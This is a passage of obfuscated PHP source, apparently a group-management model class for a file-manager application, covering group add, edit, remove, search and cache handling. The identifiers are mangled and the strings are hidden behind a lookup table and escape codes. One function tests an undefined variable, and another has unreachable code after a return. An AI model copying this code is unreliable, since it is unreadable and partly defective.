"\x6d\145\164\141\106\x69\x65\x6c\x64" => "\x67\x72\157\x75\160\111\104"); protected function cacheFunctionAlias($¯°ÔÖÓ£) { $··ë¾·ù =& $_SERVER[¤øïŠ‹²]; return array($··ë¾·ù[2210] => array($¯°ÔÖÓ£[0], $··ë¾·ù[2211]), $··ë¾·ù[2212] => array($¯°ÔÖÓ£[0], $··ë¾·ù[2213])); } protected function ___getInfo($ÒÒ¿Íåş) { $ş¡²×ê¸ = $this->getInfoSimple($ÒÒ¿Íåş); if (!$ş¡²×ê¸) { return !1; } return $this->_listDataApplyItem($ş¡²×ê¸); } protected function ___getInfoSimple($ğ‹Åõ–ê) { $¶¦Ä²§ = array($_SERVER[¤øïŠ‹²][1444] => intval($ğ‹Åõ–ê)); $«Ë”èÇì = $this->where($¶¦Ä²§)->find(); return is_array($«Ë”èÇì) ? $«Ë”èÇì : array(); } protected function groupAdd($ÍÕ¨ôõø) { $¼·¯¨¸« =& $_SERVER[¤øïŠ‹²]; if (!$ÍÕ¨ôõø[$¼·¯¨¸«[203]] && isset($ÍÕ¨ôõø[$¼·¯¨¸«[1444]]) && $ÍÕ¨ôõø[$¼·¯¨¸«[1444]] == 1) { if ($øùŠË›— = $this->getInfoSimple($ÍÕ¨ôõø[$¼·¯¨¸«[1444]], !0)) { return $ÍÕ¨ôõø[$¼·¯¨¸«[1444]]; } } else { $øùŠË›— = $this->getInfoSimple($ÍÕ¨ôõø[$¼·¯¨¸«[203]]); if (!$øùŠË›—) { return !1; } } $Ü¯¼ıÑ = $¼·¯¨¸«[619]; if ($øùŠË›—[$¼·¯¨¸«[610]]) { $Ü¯¼ıÑ = $øùŠË›—[$¼·¯¨¸«[610]] . $øùŠË›—[$¼·¯¨¸«[1444]] . $¼·¯¨¸«[50]; } $ŸÄñó— = array($¼·¯¨¸«[515] => $this->groupNameAuto($ÍÕ¨ôõø[$¼·¯¨¸«[203]], $ÍÕ¨ôõø[$¼·¯¨¸«[32]]), $¼·¯¨¸«[498] => $ÍÕ¨ôõø[$¼·¯¨¸«[203]], $¼·¯¨¸«[681] => $Ü¯¼ıÑ, $¼·¯¨¸«[2214] => $ÍÕ¨ôõø[$¼·¯¨¸«[2118]], $¼·¯¨¸«[2215] => 0, $¼·¯¨¸«[2135] => 0); $ÍÕ¨ôõø[$¼·¯¨¸«[32]] = $ŸÄñó—[$¼·¯¨¸«[32]]; if (isset($ÍÕ¨ôõø[$¼·¯¨¸«[2153]])) { $ŸÄñó—[$¼·¯¨¸«[2153]] = $ÍÕ¨ôõø[$¼·¯¨¸«[2153]]; } else { $²Äú´òª = $this->max($¼·¯¨¸«[2153]); if (!$²Äú´òª) { $²Äú´òª = 0; } $ŸÄñó—[$¼·¯¨¸«[2153]] = $²Äú´òª + 1; } if (!empty($ÍÕ¨ôõø[$¼·¯¨¸«[1444]])) { $ŸÄñó—[$¼·¯¨¸«[1444]] = $ÍÕ¨ôõø[$¼·¯¨¸«[1444]]; } $ÖƒÙäŒ = $this->add($ŸÄñó—); $this->groupMetaEdit($ÖƒÙäŒ, $ÍÕ¨ôõø); Model($¼·¯¨¸«[1482])->groupRootAdd($ÖƒÙäŒ); $this->_clearCache($ÍÕ¨ôõø[$¼·¯¨¸«[203]]); return $ÖƒÙäŒ; } protected function groupEdit($â¢‚®, $¥œøõ…®) { $¨“ÓĞëÎ =& $_SERVER[¤øïŠ‹²]; $˜ìàˆà² = $this->getInfoSimple($â¢‚®); if (!$˜ìàˆà²) { return !1; } if (!empty($¥œøõ…®[$¨“ÓĞëÎ[203]])) { $ÇçÎÂÚ = $this->getInfoSimple($¥œøõ…®[$¨“ÓĞëÎ[203]]); if (!$ÇçÎÂÚ) { return !1; } if ($˜ìàˆà²[$¨“ÓĞëÎ[1444]] == $ÇçÎÂÚ[$¨“ÓĞëÎ[1444]]) { return !1; } if ($¥œøõ…®[$¨“ÓĞëÎ[203]] != $˜ìàˆà²[$¨“ÓĞëÎ[203]]) { if ($ÇçÎÂÚ[$¨“ÓĞëÎ[610]] !== $˜ìàˆà²[$¨“ÓĞëÎ[610]] && strpos($ÇçÎÂÚ[$¨“ÓĞëÎ[610]], $˜ìàˆà²[$¨“ÓĞëÎ[610]] . $˜ìàˆà²[$¨“ÓĞëÎ[1444]] . $¨“ÓĞëÎ[50]) === 0) { return !1; } $¥œøõ…®[$¨“ÓĞëÎ[681]] = $ÇçÎÂÚ[$¨“ÓĞëÎ[610]] . $¥œøõ…®[$¨“ÓĞëÎ[203]] . $¨“ÓĞëÎ[50]; $this->_changeChildLevel($˜ìàˆà², $ÇçÎÂÚ); $this->_clearCache($ÇçÎÂÚ[$¨“ÓĞëÎ[1444]]); $this->_clearCache($˜ìàˆà²[$¨“ÓĞëÎ[203]]); } } $this->groupMetaEdit($â¢‚®, $¥œøõ…®); $this->_clearChildrenCache($˜ìàˆà²); return $this->where(array($¨“ÓĞëÎ[2216] => $â¢‚®))->save($¥œøõ…®); } private function groupMetaEdit($‘†—íá, &$ì²£ºúÙ) { $¡¶Áæ•” =& $_SERVER[¤øïŠ‹²]; if (isset($ì²£ºúÙ[$¡¶Áæ•”[32]])) { $this->setNamePinyin($‘†—íá, $ì²£ºúÙ[$¡¶Áæ•”[32]]); } if (isset($ì²£ºúÙ[$¡¶Áæ•”[2217]])) { $Ê·ÒùæŞ = array($¡¶Áæ•”[2217] => $ì²£ºúÙ[$¡¶Áæ•”[2217]], $¡¶Áæ•”[2218] => $ì²£ºúÙ[$¡¶Áæ•”[2218]]); unset($ì²£ºúÙ[$¡¶Áæ•”[2217]]); unset($ì²£ºúÙ[$¡¶Áæ•”[2218]]); if (isset($ì²£ºúÙ[$¡¶Áæ•”[2219]])) { $•ÙñóÉø = $¡¶Áæ•”[1440] . $‘†—íá; $Ğ¾ÔĞ™ = $¡¶Áæ•”[1439]; $Ú”íøö = $ì²£ºúÙ[$¡¶Áæ•”[2219]] ? $ì²£ºúÙ[$¡¶Áæ•”[2219]] : $¡¶Áæ•”[12]; $Æï¾€æõ = Model($¡¶Áæ•”[1438])->get($•ÙñóÉø, $Ğ¾ÔĞ™); $Æï¾€æõ = $Æï¾€æõ ? $Æï¾€æõ : $¡¶Áæ•”[12]; if ($Æï¾€æõ != $Ú”íøö) { if (!$Ú”íøö && $Æï¾€æõ) { Model($¡¶Áæ•”[1438])->remove($•ÙñóÉø, $Ğ¾ÔĞ™); } else { if ($Ú”íøö) { Model($¡¶Áæ•”[1438])->set($•ÙñóÉø, $Ú”íøö, $Ğ¾ÔĞ™); } } } $Ê·ÒùæŞ[$¡¶Áæ•”[2219]] = $Ú”íøö; } $this->metaSet($‘†—íá, $Ê·ÒùæŞ); } } private function _clearChildrenCache($ı¤²ñê) { $ÚÍÄ²·¼ =& $_SERVER[¤øïŠ‹²]; $ùåâËè› = array($ÚÍÄ²·¼[681] => array($ÚÍÄ²·¼[641], $ı¤²ñê[$ÚÍÄ²·¼[610]] . $ı¤²ñê[$ÚÍÄ²·¼[1444]] . $ÚÍÄ²·¼[642])); $ŠóİÓç¼ = $this->field($ÚÍÄ²·¼[1444])->where($ùåâËè›)->select(); foreach ($ŠóİÓç¼ as $Š“ÀßªŞ) { $this->_clearCache($Š“ÀßªŞ[$ÚÍÄ²·¼[1444]]); } } private function _clearCache($Òµ¶´¬ì) { $×äƒ ó =& $_SERVER[¤øïŠ‹²]; $this->cacheFunctionClear($×äƒ ó[2220], $Òµ¶´¬ì); $this->cacheFunctionClear($×äƒ ó[2221], $Òµ¶´¬ì); } private function _changeChildLevel($Óçš…Üª, $È¿ºËÛÖ, $íÌ´Ÿ† = false) { $¦Ï™ø =& $_SERVER[¤øïŠ‹²]; $´‰—„´è = $Óçš…Üª[$¦Ï™ø[610]] . $Óçš…Üª[$¦Ï™ø[1444]] . $¦Ï™ø[50]; $‚–¢ˆâê = $È¿ºËÛÖ[$¦Ï™ø[610]] . $È¿ºËÛÖ[$¦Ï™ø[1444]] . $¦Ï™ø[50] . $Óçš…Üª[$¦Ï™ø[1444]] . $¦Ï™ø[50]; if ($íÌ´Ÿ†) { $‚–¢ˆâê = $È¿ºËÛÖ[$¦Ï™ø[610]] . $È¿ºËÛÖ[$¦Ï™ø[1444]] . $¦Ï™ø[50]; } $Çè‘¯Â– = array($¦Ï™ø[681] => array($¦Ï™ø[641], $Óçš…Üª[$¦Ï™ø[610]] . $Óçš…Üª[$¦Ï™ø[1444]] . $¦Ï™ø[642])); $ØÌÛñ–ª = array($¦Ï™ø[681] => array($¦Ï™ø[690], "\x72\x65\x70\154\x61\143\x65\50\160\x61\162\145\156\x74\x4c\145\166\145\154\54\47{$´‰—„´è}\47\x2c\x27{$‚–¢ˆâê}\47\51")); $this->_clearChildrenCache($Óçš…Üª); $this->where($Çè‘¯Â–)->data($ØÌÛñ–ª)->save(); } public function setNamePinyin($—ï»ˆš†, $”ïóÙµ = false) { $Æƒ×İá† =& $_SERVER[¤øïŠ‹²]; if (!$”ïóÙµ) { $’Æò¼‹ = $this->getInfoSimple($—ï»ˆš†); $”ïóÙµ = $’Æò¼‹[$Æƒ×İá†[32]]; } if (!Input::check($”ïóÙµ, $Æƒ×İá†[684])) { $this->metaSet($—ï»ˆš†, $Æƒ×İá†[558], null); $this->metaSet($—ï»ˆš†, $Æƒ×İá†[557], null); return; } $õšôÍ¤ğ = array($Æƒ×İá†[558] => str_replace($Æƒ×İá†[53], $Æƒ×İá†[12], Pinyin::get($”ïóÙµ)), $Æƒ×İá†[557] => Pinyin::get($”ïóÙµ, $Æƒ×İá†[685])); $this->metaSet($—ï»ˆš†, $õšôÍ¤ğ); } protected function metaSet($®…™‚­–, $“°¶Û¿İ = null, $©ú‘Éâ» = null) { $this->_clearCache($®…™‚­–); return parent::metaSet($®…™‚­–, $“°¶Û¿İ, $©ú‘Éâ»); } protected function groupStatus($£¾ÌèÏ, $Øï÷ÂÕ­) { $úñ›ˆÕÏ =& $_SERVER[¤øïŠ‹²]; $“Ï‚ó²ö = $this->getInfoSimple($£¾ÌèÏ); if (!$“Ï‚ó²ö) { return !1; } $this->_clearCache($£¾ÌèÏ); return $this->metaSet($£¾ÌèÏ, $úñ›ˆÕÏ[851], $Øï÷ÂÕ­); if ($Øï÷ÂÕ­ == $úñ›ˆÕÏ[102]) { $Š·£ı’‰ = $this->parentLevelArray($“Ï‚ó²ö[$úñ›ˆÕÏ[610]]); } else { } $Š·£ı’‰[] = $“Ï‚ó²ö[$úñ›ˆÕÏ[1444]]; $µÀêÄ­ = array(); foreach ($Š·£ı’‰ as $£¾ÌèÏ) { $µÀêÄ­[] = array($úñ›ˆÕÏ[1444] => $£¾ÌèÏ, $úñ›ˆÕÏ[106] => $úñ›ˆÕÏ[851], $úñ›ˆÕÏ[462] => $Øï÷ÂÕ­); $this->_clearCache($£¾ÌèÏ); } return Model($úñ›ˆÕÏ[2222])->addAll($µÀêÄ­, array(), !0); } protected function groupRemove($ĞëÄÏ¨œ, $ÇÀÇÛß = false) { $Ú¬ÂÂ€ë =& $_SERVER[¤øïŠ‹²]; $ÍØ£¦ì† = array($Ú¬ÂÂ€ë[1444] => $ĞëÄÏ¨œ); $³µÙ€ØÇ = $this->where($ÍØ£¦ì†)->find(); if (!$³µÙ€ØÇ || $³µÙ€ØÇ[$Ú¬ÂÂ€ë[203]] == 0) { return !1; } if (!$ÇÀÇÛß) { $ùüÛÎÖÔ = $this->getInfoSimple($³µÙ€ØÇ[$Ú¬ÂÂ€ë[203]]); $this->_changeChildLevel($³µÙ€ØÇ, $ùüÛÎÖÔ, !0); $this->where(array($Ú¬ÂÂ€ë[203] => $ĞëÄÏ¨œ))->save(array($Ú¬ÂÂ€ë[203] => $³µÙ€ØÇ[$Ú¬ÂÂ€ë[203]])); $this->_clearCache($ùüÛÎÖÔ[$Ú¬ÂÂ€ë[1444]]); } Model($Ú¬ÂÂ€ë[2222])->where($ÍØ£¦ì†)->delete(); Model($Ú¬ÂÂ€ë[2223])->where($ÍØ£¦ì†)->delete(); Model($Ú¬ÂÂ€ë[934])->groupRootRemove($ĞëÄÏ¨œ); $this->_clearCache($³µÙ€ØÇ[$Ú¬ÂÂ€ë[203]]); return $this->where($ÍØ£¦ì†)->delete(); } protected function groupSort($šƒ€˜ªÀ) { $ü®¯²î¶ =& $_SERVER[¤øïŠ‹²]; $·Ç±öÄ¯ = array(); foreach ($šƒ€˜ªÀ as $¦ÇşşÛõ => $ã§ËÀáâ) { $·Ç±öÄ¯[] = array($ü®¯²î¶[1444], $ã§ËÀáâ, $ü®¯²î¶[2153], $¦ÇşşÛõ + 1); } $this->saveAll($·Ç±öÄ¯); } public function listData() { $Íê§ïÉ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Íê§ïÉ[$_SERVER[¤øïŠ‹²][457]]); return $Íê§ïÉ; } private function _makeOrder($‡÷ãô¦ = '') { $ˆ‘Û‘ =& $_SERVER[¤øïŠ‹²]; $„Ûôğ° = array($ˆ‘Û‘[1444], $ˆ‘Û‘[32], $ˆ‘Û‘[2120], $ˆ‘Û‘[244]); $ôÕş–œ = array($ˆ‘Û‘[543] => $ˆ‘Û‘[544], $ˆ‘Û‘[545] => $ˆ‘Û‘[546]); $½ÒÙë§ß = Input::get($ˆ‘Û‘[550], $ˆ‘Û‘[7], $ˆ‘Û‘[2135], $„Ûôğ°); $Ø˜Ø½™Í = Input::get($ˆ‘Û‘[551], $ˆ‘Û‘[7], $ˆ‘Û‘[2224], array($ˆ‘Û‘[2224], $ˆ‘Û‘[545])); $Ø˜Ø½™Í = $ôÕş–œ[$Ø˜Ø½™Í]; $‡÷ãô¦ = $‡÷ãô¦ . "{$½ÒÙë§ß}\x20{$Ø˜Ø½™Í}\54\40\x67\x72\x6f\165\x70\x49\104\40\141\163\143"; return $this->order($‡÷ãô¦); } public function listChild($ëÂÌşõŠ) { $±ãß–¦Ñ =& $_SERVER[¤øïŠ‹²]; $×¦Å¨î‹ = $this->where(array($±ãß–¦Ñ[203] => $ëÂÌşõŠ))->_makeOrder()->selectPage(200); $this->_listDataApply($×¦Å¨î‹[$±ãß–¦Ñ[457]]); return $×¦Å¨î‹; } public function listChildIds($ßËäÍú) { $£’¸óÕÜ =& $_SERVER[¤øïŠ‹²]; if (is_string($»õŠÛØ)) { $ßËäÍú = explode($£’¸óÕÜ[50], $ßËäÍú); } $ˆ•¼¹™ñ = $this->where(array($£’¸óÕÜ[1444] => array($£’¸óÕÜ[7], $ßËäÍú)))->field($£’¸óÕÜ[2225])->select(); if (!$ˆ•¼¹™ñ) { return !1; } $‰‹Åˆæ = array(); foreach ($ˆ•¼¹™ñ as $ŸÎˆéÒõ) { $‰‹Åˆæ[] = "\x73\x65\154\145\143\164\x20\x67\162\157\x75\160\x49\x44\x20\x66\x72\x6f\x6d\x20\140\147\x72\x6f\165\x70\140\x20\167\150\145\x72\x65\x20\160\x61\x72\x65\156\164\x4c\145\x76\x65\154\x20\154\151\x6b\145\40\x27{$ŸÎˆéÒõ[$£’¸óÕÜ[610]]}{$ŸÎˆéÒõ[$£’¸óÕÜ[1444]]}\54\45\47"; } $‰‹Åˆæ = implode($£’¸óÕÜ[2226], $‰‹Åˆæ); $ˆ•¼¹™ñ = $this->query($‰‹Åˆæ); if (!$ˆ•¼¹™ñ) { return array(); } $ßËäÍú = array_to_keyvalue($ˆ•¼¹™ñ, $£’¸óÕÜ[12], $£’¸óÕÜ[1444]); return array_unique($ßËäÍú); } public function listByID($ÔŸò˜·³) { $ÑŸöÀ¬ =& $_SERVER[¤øïŠ‹²]; if (!$ÔŸò˜·³) { return array(); } $½ŒËû­§ = array($ÑŸöÀ¬[1444] => array($ÑŸöÀ¬[7], $ÔŸò˜·³)); $Ô­¼´ÉÀ = $this->where($½ŒËû­§)->select(); $Ô­¼´ÉÀ = array_sort_keep($Ô­¼´ÉÀ, $ÑŸöÀ¬[1444], $ÔŸò˜·³); $this->_listDataApply($Ô­¼´ÉÀ); return $Ô­¼´ÉÀ; } public function listSearch($õ··) { $Œ‘ğûœÄ =& $_SERVER[¤øïŠ‹²]; $ÜŸùğË = trim($õ··[$Œ‘ğûœÄ[2227]]); $Ïß§±Ò› = explode($Œ‘ğûœÄ[53], $ÜŸùğË); if (!$ÜŸùğË || count($Ïß§±Ò›) == 1) { return $this->listSearchNow($õ··); } $ŞÖò¬ïç = array($Œ‘ğûœÄ[457] => array()); foreach ($Ïß§±Ò› as $¡—ãõØ) { if (!trim($¡—ãõØ)) { continue; } $õ··[$Œ‘ğûœÄ[2227]] = $¡—ãõØ; $øß˜Æ‡À = $this->listSearchNow($õ··); $ŞÖò¬ïç[$Œ‘ğûœÄ[457]] = array_merge($ŞÖò¬ïç[$Œ‘ğûœÄ[457]], $øß˜Æ‡À[$Œ‘ğûœÄ[457]]); } $ŞÖò¬ïç[$Œ‘ğûœÄ[457]] = array_unique_by_key($ŞÖò¬ïç[$Œ‘ğûœÄ[457]], $Œ‘ğûœÄ[1444]); $ŞÖò¬ïç[$Œ‘ğûœÄ[454]] = array($Œ‘ğûœÄ[455] => count($ŞÖò¬ïç[$Œ‘ğûœÄ[457]]), $Œ‘ğûœÄ[451] => 20, $Œ‘ğûœÄ[440] => 1, $Œ‘ğûœÄ[456] => 1); return $ŞÖò¬ïç; } public function listSearchNow($†ğÅ¸) { $õëú•¤ =& $_SERVER[¤øïŠ‹²]; $¤çğ£‹« = trim($†ğÅ¸[$õëú•¤[2227]]); $¸Ê¯¦­ = isset($†ğÅ¸[$õëú•¤[2228]]) ? $†ğÅ¸[$õëú•¤[2228]] : !1; if (!trim($¤çğ£‹«)) { return !1; } $¤çğ£‹« = str_replace($õëú•¤[2229], $õëú•¤[2230], $¤çğ£‹«); $ÂÇğ‚¼¤ = array($õëú•¤[1444] => array($õëú•¤[480], "{$¤çğ£‹«}\45"), $õëú•¤[32] => array($õëú•¤[480], "\45{$¤çğ£‹«}\45"), $õëú•¤[1116] => $õëú•¤[2231]); if ($¸Ê¯¦­) { $£†®âê¡ = $this->getInfoSimple($¸Ê¯¦­); $¯¶³¸Æò = $£†®âê¡[$õëú•¤[610]] . $¸Ê¯¦­ . $õëú•¤[642]; $ÂÇğ‚¼¤ = array($ÂÇğ‚¼¤, array($õëú•¤[610] => array($õëú•¤[480], $¯¶³¸Æò))); } $ÂÇğ‚¼¤ = $this->parseWhereLike($ÂÇğ‚¼¤); $Ëó½¤ = $this->_makeOrder()->where($ÂÇğ‚¼¤)->selectPage(20); $Ëó½¤ = $Ëó½¤ ? $Ëó½¤ : array($õëú•¤[457] => array(), $õëú•¤[454] => array()); if (!$Ëó½¤ || count($Ëó½¤[$õëú•¤[457]]) < 5 && Input::check($¤çğ£‹«, $õëú•¤[405])) { $Ë¨Ğ‰ø = $this->groupChildrenAll($¸Ê¯¦­); $¾âğ”À = $this->_searchFromMeta($õëú•¤[557], $¤çğ£‹«, 10, $Ë¨Ğ‰ø); $¢«ÖÁğ = $this->_searchFromMeta($õëú•¤[558], $¤çğ£‹«, 10, $Ë¨Ğ‰ø); $œ¤ñ†«‰ = array_merge($¾âğ”À, $¢«ÖÁğ, $Ëó½¤[$õëú•¤[457]]); $Ëó½¤[$õëú•¤[457]] = array_unique_by_key($œ¤ñ†«‰, $õëú•¤[1444]); $Ëó½¤[$õëú•¤[454]][$õëú•¤[455]] = count($Ëó½¤[$õëú•¤[457]]); $Ëó½¤[$õëú•¤[454]][$õëú•¤[456]] = ceil($Ëó½¤[$õëú•¤[454]][$õëú•¤[455]] / $Ëó½¤[$õëú•¤[454]][$õëú•¤[451]]); } $this->_listDataApply($Ëó½¤[$õëú•¤[457]]); return $Ëó½¤; } protected function groupChildrenAll($Ô’ÁÀúŒ) { $–Û¥¥‚¶ =& $_SERVER[¤øïŠ‹²]; if (!$Ô’ÁÀúŒ) { return !1; } if (!is_array($Ô’ÁÀúŒ)) { $Ô’ÁÀúŒ = array($Ô’ÁÀúŒ); } $‰£ì£†Û = $Ô’ÁÀúŒ; foreach ($Ô’ÁÀúŒ as $Â’°Ä‰à) { $µÈ×°¢Ó = $this->getInfoSimple($Â’°Ä‰à); $±ÙÛîÅ± = array($–Û¥¥‚¶[610] => array($–Û¥¥‚¶[480], $µÈ×°¢Ó[$–Û¥¥‚¶[610]] . $Â’°Ä‰à . $–Û¥¥‚¶[642])); $Öœş…Àé = $this->field($–Û¥¥‚¶[1444])->where($±ÙÛîÅ±)->select(); $‰£ì£†Û = array_merge($‰£ì£†Û, array_to_keyvalue($Öœş…Àé, $–Û¥¥‚¶[12], $–Û¥¥‚¶[1444])); } return array_unique($‰£ì£†Û); } private function _searchFromMeta($ƒ ê–—õ, $©¿Í±ìû, $›®òüî, $©Ú·½åÓ) { $…ÏğÀŸ± =& $_SERVER[¤øïŠ‹²]; $©¿Í±ìû = strtolower($©¿Í±ìû); $ÈÄ©îÈ = array($…ÏğÀŸ±[106] => $ƒ ê–—õ, $…ÏğÀŸ±[462] => array($…ÏğÀŸ±[480], "\45{$©¿Í±ìû}\x25")); $ÈÄ©îÈ = $this->parseWhereLike($ÈÄ©îÈ); if ($©Ú·½åÓ) { $ÈÄ©îÈ[$…ÏğÀŸ±[1444]] = array($…ÏğÀŸ±[7], $©Ú·½åÓ); } $¶ï ¬ü— = Model($…ÏğÀŸ±[2232])->where($ÈÄ©îÈ)->limit($›®òüî)->select(); if (!$¶ï ¬ü—) { return array(); } $¶ï ¬ü— = array_to_keyvalue($¶ï ¬ü—, $…ÏğÀŸ±[12], $…ÏğÀŸ±[1444]); $’Äƒº´¹ = $this->where(array($…ÏğÀŸ±[2216] => array($…ÏğÀŸ±[7], $¶ï ¬ü—)))->select(); if (!$’Äƒº´¹) { return array(); } return $’Äƒº´¹; } protected function _listDataApplyItem($ÑáæÂîà) { $úâ©´Æ¶ = array($ÑáæÂîà); $this->_listDataApply($úâ©´Æ¶); return $úâ©´Æ¶[0]; } protected function _listDataApply(&$Ñ´ÏÆÃí) { $ì‰‚ºƒ =& $_SERVER[¤øïŠ‹²]; if (!$Ñ´ÏÆÃí) { return; } $ùŒèİ˜å = array_to_keyvalue($Ñ´ÏÆÃí, $ì‰‚ºƒ[12], $ì‰‚ºƒ[1444]); $this->_listAppendChildren($Ñ´ÏÆÃí); $this->_listAppendChildrenMember($Ñ´ÏÆÃí); $this->_listAppendMeta($Ñ´ÏÆÃí, $ùŒèİ˜å); $this->_listAppendParent($Ñ´ÏÆÃí); $this->_listAppendSourceRoot($Ñ´ÏÆÃí, $ùŒèİ˜å); } private function _listAppendChildren(&$éÉÄÚ·¥) { $–¼Ğòë¸ =& $_SERVER[¤øïŠ‹²]; $Ôœ ›Ó = array_to_keyvalue($éÉÄÚ·¥, $–¼Ğòë¸[12], $–¼Ğòë¸[1444]); $ÀÃ­™¾ = array($–¼Ğòë¸[203] => array($–¼Ğòë¸[7], $Ôœ ›Ó)); $öºÜÜî = array($–¼Ğòë¸[203], $–¼Ğòë¸[2233] => $–¼Ğòë¸[591]); $àú–…²± = $this->field($öºÜÜî)->where($ÀÃ­™¾)->group($–¼Ğòë¸[203])->select(); $±ùúÑ«æ = array_to_keyvalue($àú–…²±, $–¼Ğòë¸[203], $–¼Ğòë¸[591]); foreach ($éÉÄÚ·¥ as &$†ø­Å£) { $ÎÜ×šÓÂ = $†ø­Å£[$–¼Ğòë¸[1444]]; $†ø­Å£[$–¼Ğòë¸[2234]] = isset($±ùúÑ«æ[$ÎÜ×šÓÂ]) ? intval($±ùúÑ«æ[$ÎÜ×šÓÂ]) : !1; } unset($†ø­Å£); } private function _listAppendChildrenMember(&$Ï ¿ğê) { $µÆ¹…ÉØ =& $_SERVER[¤øïŠ‹²]; $Ÿ¶—ÙÅ¹ = array_to_keyvalue($Ï ¿ğê, $µÆ¹…ÉØ[12], $µÆ¹…ÉØ[1444]); $ÙÕ“ÁĞú = array($µÆ¹…ÉØ[1444] => array($µÆ¹…ÉØ[7], $Ÿ¶—ÙÅ¹)); $áÔ†£Ï = array($µÆ¹…ÉØ[1444], $µÆ¹…ÉØ[2233] => $µÆ¹…ÉØ[591]); $ãÓ‰¯»­ = Model($µÆ¹…ÉØ[2223])->field($áÔ†£Ï)->where($ÙÕ“ÁĞú)->group($µÆ¹…ÉØ[1444])->select(); $‘›×¼‡ = array_to_keyvalue($ãÓ‰¯»­, $µÆ¹…ÉØ[1444], $µÆ¹…ÉØ[591]); foreach ($Ï ¿ğê as &$ÚãØªàÄ) { $ÑòÂûÁ‹ = $ÚãØªàÄ[$µÆ¹…ÉØ[1444]]; $ÚãØªàÄ[$µÆ¹…ÉØ[2235]] = isset($‘›×¼‡[$ÑòÂûÁ‹]) ? intval($‘›×¼‡[$ÑòÂûÁ‹]) : !1; } unset($ÚãØªàÄ); } private function _listAppendMeta(&$±±Ô‡éº, $ÒêÓ¦½ê) { $úí£×¨Ğ =& $_SERVER[¤øïŠ‹²]; $ÊÀ¶óí¥ = array($úí£×¨Ğ[1444] => array($úí£×¨Ğ[7], $ÒêÓ¦½ê)); $¨ä”ã¿Ø = Model($úí£×¨Ğ[2222])->where($ÊÀ¶óí¥)->select(); $¨ä”ã¿Ø = array_to_keyvalue_group($¨ä”ã¿Ø, $úí£×¨Ğ[1444]); foreach ($¨ä”ã¿Ø as &$¸­††¤) { $¸­††¤ = array_to_keyvalue($¸­††¤, $úí£×¨Ğ[106], $úí£×¨Ğ[462]); } unset($¸­††¤); foreach ($±±Ô‡éº as &$´½”˜ã) { $´½”˜ã[$úí£×¨Ğ[561]] = array(); if (isset($¨ä”ã¿Ø[$´½”˜ã[$úí£×¨Ğ[1444]]])) { $´½”˜ã[$úí£×¨Ğ[561]] = $¨ä”ã¿Ø[$´½”˜ã[$úí£×¨Ğ[1444]]]; } } unset($´½”˜ã); } protected function parentLevelArray($¤îÃÚÖ) { $Ùãù”¨› =& $_SERVER[¤øïŠ‹²]; $¤îÃÚÖ = explode($Ùãù”¨›[50], trim($¤îÃÚÖ, $Ùãù”¨›[50])); $¤îÃÚÖ = array_remove_value($¤îÃÚÖ, $Ùãù”¨›[241]); return $¤îÃÚÖ; } protected function parentInGroup($í±úÃ‚«, $’Ìª—Œ±) { $·ûõš•‚ =& $_SERVER[¤øïŠ‹²]; $¢Ÿ™¼½é = $this->getInfoSimple($í±úÃ‚«); if (!$¢Ÿ™¼½é) { return !0; } $×Ãñ¹ = $this->parentLevelArray($¢Ÿ™¼½é[$·ûõš•‚[610]]); $×Ãñ¹[] = $í±úÃ‚«; foreach ($×Ãñ¹ as $í±úÃ‚«) { if (in_array($í±úÃ‚« . $·ûõš•‚[12], $’Ìª—Œ±)) { return !0; } } return !1; } private function _listAppendParent(&$œ½æ¬ùÀ) { $Æ´ÜîÀù =& $_SERVER[¤øïŠ‹²]; $ÇëÛğ°š = array(); foreach ($œ½æ¬ùÀ as &$¥±·ÂµÈ) { $ÇëÛğ°š[$¥±·ÂµÈ[$Æ´ÜîÀù[1444]]] = $¥±·ÂµÈ[$Æ´ÜîÀù[32]]; $“¥Î–Õ¦ = $this->parentLevelArray($¥±·ÂµÈ[$Æ´ÜîÀù[610]]); foreach ($“¥Î–Õ¦ as $¾íÇ³Ê) { if (!isset($ÇëÛğ°š[$¾íÇ³Ê])) { $ÇëÛğ°š[$¾íÇ³Ê] = 0; } } } unset($¥±·ÂµÈ); foreach ($ÇëÛğ°š as $ˆÍšåè„ => $Ğè…Ÿú’) { if ($Ğè…Ÿú’) { continue; } $¼åæÅäì = $this->getInfoSimple($ˆÍšåè„); $ÇëÛğ°š[$ˆÍšåè„] = $¼åæÅäì[$Æ´ÜîÀù[32]]; } $úøö©Ô™ = $GLOBALS[$Æ´ÜîÀù[6]][$Æ´ÜîÀù[103]][$Æ´ÜîÀù[2236]]; if (KodUser::isRoot()) { $úøö©Ô™ = !1; } foreach ($œ½æ¬ùÀ as &$¥±·ÂµÈ) { $“¥Î–Õ¦ = $this->parentLevelArray($¥±·ÂµÈ[$Æ´ÜîÀù[610]]); $‚Ë‰Ùâİ = $Æ´ÜîÀù[12]; foreach ($“¥Î–Õ¦ as $ˆÍšåè„ => $¾íÇ³Ê) { if ($úøö©Ô™ && $ˆÍšåè„ == 0) { continue; } $‚Ë‰Ùâİ .= $ÇëÛğ°š[$¾íÇ³Ê] . $Æ´ÜîÀù[8]; } if ($“¥Î–Õ¦) { $‚Ë‰Ùâİ .= $¥±·ÂµÈ[$Æ´ÜîÀù[32]]; } $¥±·ÂµÈ[$Æ´ÜîÀù[615]] = str_replace($Æ´ÜîÀù[267], $Æ´ÜîÀù[8], $‚Ë‰Ùâİ); } unset($¥±·ÂµÈ); } private function _listAppendSourceRoot(&$Ğô¶¾ÁÅ, $ŞÜ‹—‡ó) { $ÜœÑŒÜ± =& $_SERVER[¤øïŠ‹²]; $Ş¦İ—Œ = Model($ÜœÑŒÜ±[934])->listSourceRoot(SourceModel::TYPE_GROUP, $ŞÜ‹—‡ó); $Ş¦İ—Œ = array_to_keyvalue($Ş¦İ—Œ, $ÜœÑŒÜ±[595]); $Ş¦İ—Œ = array_remove_key($Ş¦İ—Œ, $ÜœÑŒÜ±[595]); foreach ($Ğô¶¾ÁÅ as &$‹‘ôÌ¾—) { $‹‘ôÌ¾—[$ÜœÑŒÜ±[101]] = $Ş¦İ—Œ[$‹‘ôÌ¾—[$ÜœÑŒÜ±[1444]]] ? $Ş¦İ—Œ[$‹‘ôÌ¾—[$ÜœÑŒÜ±[1444]]] : array(); } unset($‹‘ôÌ¾—); } protected function groupMerge($É‡˜ëº¹) { $É‡˜ëº¹ = array_values(array_unique($É‡˜ëº¹)); $ÂÖÜ­â = array(); for ($Ö›¸Š‹® = 0; $Ö›¸Š‹® < count($É‡˜ëº¹); $Ö›¸Š‹®++) { $ü”êŒç— = !1; for 